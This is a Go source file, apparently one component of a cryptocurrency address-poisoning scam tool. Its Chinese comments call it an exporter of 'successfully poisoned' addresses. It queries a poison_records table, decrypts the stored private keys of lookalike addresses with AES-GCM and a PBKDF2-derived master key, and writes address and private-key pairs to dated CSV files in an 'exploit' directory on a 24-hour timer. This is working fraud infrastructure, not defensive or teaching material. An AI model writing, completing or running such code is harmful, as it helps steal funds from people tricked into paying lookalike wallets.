package core

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"time"

	"github.com/jackc/pgx/v5/pgxpool"
	"go.uber.org/zap"
	"golang.org/x/crypto/pbkdf2"
)

// ExporterConfig 地址导出器配置
type ExporterConfig struct {
	Interval   time.Duration // 导出间隔 (默认24小时)
	ExportPath string        // 导出目录
}

// DefaultExporterConfig 默认配置
func DefaultExporterConfig() ExporterConfig {
	return ExporterConfig{
		Interval:   24 * time.Hour,
		ExportPath: "/root/base-test/exploit",
	}
}

// Exporter 成功投毒地址导出器
type Exporter struct {
	db        *pgxpool.Pool
	logger    *zap.Logger
	config    ExporterConfig
	stats     *Stats
	masterKey []byte
	stopCh    chan struct{}
}

// NewExporter 创建导出器
func NewExporter(
	db *pgxpool.Pool,
	logger *zap.Logger,
	config ExporterConfig,
	stats *Stats,
	masterKey []byte,
) *Exporter {
	return &Exporter{
		db:        db,
		logger:    logger,
		config:    config,
		stats:     stats,
		masterKey: masterKey,
		stopCh:    make(chan struct{}),
	}
}

// Start 启动导出器
func (e *Exporter) Start(ctx context.Context) {
	e.logger.Info("📤 地址导出器启动",
		zap.Duration("间隔", e.config.Interval),
		zap.String("导出目录", e.config.ExportPath))

	// 启动后先执行一次导出
	go e.exportAddresses(ctx)

	ticker := time.NewTicker(e.config.Interval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-e.stopCh:
			return
		case <-ticker.C:
			e.exportAddresses(ctx)
		}
	}
}

// Stop 停止导出器
func (e *Exporter) Stop() {
	close(e.stopCh)
}

// exportAddresses 导出成功投毒的地址
func (e *Exporter) exportAddresses(ctx context.Context) {
	start := time.Now()
	now := time.Now()
	e.logger.Info("📤 开始导出成功投毒地址...")

	// 查询成功投毒的地址 (去重)
	rows, err := e.db.Query(ctx, `
		SELECT DISTINCT fake_address, encrypted_private_key
		FROM poison_records
		WHERE status = 'success'
		ORDER BY fake_address
	`)
	if err != nil {
		e.logger.Error("查询投毒记录失败", zap.Error(err))
		return
	}
	defer rows.Close()

	// 按日期创建子目录: /root/base-test/exploit/2024-12-22/
	dateDir := filepath.Join(e.config.ExportPath, now.Format("2006-01-02"))
	if err := os.MkdirAll(dateDir, 0755); err != nil {
		e.logger.Error("创建导出目录失败", zap.Error(err))
		return
	}

	// 生成文件名: addresses_20241222_150405.csv
	filename := fmt.Sprintf("addresses_%s.csv", now.Format("20060102_150405"))
	filePath := filepath.Join(dateDir, filename)

	file, err := os.Create(filePath)
	if err != nil {
		e.logger.Error("创建导出文件失败", zap.Error(err))
		return
	}
	defer file.Close()

	// 写入CSV表头
	file.WriteString("address,private_key\n")

	var count int
	for rows.Next() {
		var address string
		var encryptedPK []byte
		if err := rows.Scan(&address, &encryptedPK); err != nil {
			continue
		}

		// 解密私钥
		privateKey, err := e.decryptPrivateKey(encryptedPK)
		if err != nil {
			e.logger.Warn("解密私钥失败", zap.String("address", address), zap.Error(err))
			continue
		}

		// 写入CSV: 0x地址,私钥
		line := fmt.Sprintf("0x%s,%s\n", address, hex.EncodeToString(privateKey))
		file.WriteString(line)
		count++
	}

	elapsed := time.Since(start)
	e.logger.Info("📤 地址导出完成",
		zap.String("文件", filePath),
		zap.Int("地址数量", count),
		zap.Duration("耗时", elapsed))

	if e.stats != nil {
		e.stats.AddWebLog("INFO", "exporter",
			fmt.Sprintf("📤 导出完成: %d 个地址", count),
			filePath)
	}
}

// decryptPrivateKey 解密私钥
func (e *Exporter) decryptPrivateKey(encrypted []byte) ([]byte, error) {
	if len(encrypted) != 60 {
		return nil, fmt.Errorf("invalid encrypted key length: %d", len(encrypted))
	}

	// 派生密钥 (与Rust生成器相同)
	derivedKey := pbkdf2.Key(e.masterKey, []byte("address-generator-salt"), 10000, 32, sha256.New)

	nonce := encrypted[:12]
	ciphertext := encrypted[12:]

	block, err := aes.NewCipher(derivedKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	return gcm.Open(nil, nonce, ciphertext, nil)
}
